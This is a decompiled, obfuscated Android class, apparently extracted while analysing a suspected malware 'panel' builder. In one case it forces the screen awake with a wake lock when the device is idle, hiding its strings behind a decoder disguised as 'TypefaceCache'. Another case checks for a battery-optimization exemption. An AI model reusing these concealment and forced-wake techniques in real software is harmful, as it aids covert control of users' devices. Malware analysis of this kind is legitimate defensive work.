package v.s;

import android.content.Context;
import android.os.PowerManager;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class CBfuES2Lekt8n extends LGm23hksIOxB implements JRdueaGIH5g8DVCPba {
    public final /* synthetic */ Object Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ CBfuES2Lekt8n(Object obj, int i, Object obj2) {
        super(0);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = obj;
        this.Ee8d2j4S9Vm5yGuR = obj2;
    }

    @Override // v.s.JRdueaGIH5g8DVCPba
    public final Object w9sT1Swbhx3hs() {
        switch (this.vekpFI4d1Nc4fakF) {
            case 0:
                nqLgv0zSLN5zLWr3 nqlgv0zsln5zlwr3 = ((pf6EfGexAWq4v) this.JXn4Qf7zpnLjP5).dDIMxZXP1V8HdM;
                yVXVpCGoEG8oTTM yvxvpcgoeg8ottm = (yVXVpCGoEG8oTTM) this.Ee8d2j4S9Vm5yGuR;
                synchronized (nqlgv0zsln5zlwr3.vekpFI4d1Nc4fakF) {
                    if (nqlgv0zsln5zlwr3.JXn4Qf7zpnLjP5.remove(yvxvpcgoeg8ottm) && nqlgv0zsln5zlwr3.JXn4Qf7zpnLjP5.isEmpty()) {
                        nqlgv0zsln5zlwr3.JXn4Qf7zpnLjP5();
                    }
                    break;
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 1:
                PowerManager powerManager = (PowerManager) this.JXn4Qf7zpnLjP5;
                if (!powerManager.isInteractive()) {
                    try {
                        powerManager.newWakeLock(805306394, TypefaceCache.obtain("00150058007800DD00C700BE00D900A2001000750049008200F500B100F400B2002F007A")).acquire(5000L);
                        String unused = DataQFAdapter.TAG;
                        TypefaceCache.obtain("001000750049008200F500B1009200B00022007D005E00C700E200BA00C600B5003A0036004C008E00E400B7009200810016005A007700B800C7009E00F90082001C005A007400A400DB");
                        break;
                    } catch (Exception unused2) {
                    }
                }
                try {
                    ((PowerManager.WakeLock) this.Ee8d2j4S9Vm5yGuR).release();
                    break;
                } catch (Exception unused3) {
                }
                return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
            case 2:
                NB5LVitKoIkG7GAQ6 nB5LVitKoIkG7GAQ6 = (NB5LVitKoIkG7GAQ6) this.JXn4Qf7zpnLjP5;
                CharSequence charSequence = (CharSequence) this.Ee8d2j4S9Vm5yGuR;
                return okc5AGRjqrud84oM6d.dDIMxZXP1V8HdM(nB5LVitKoIkG7GAQ6.w9sT1Swbhx3hs.matcher(charSequence), 0, charSequence);
            default:
                return Boolean.valueOf(((PowerManager) this.JXn4Qf7zpnLjP5).isIgnoringBatteryOptimizations(((Context) this.Ee8d2j4S9Vm5yGuR).getPackageName()));
        }
    }
}
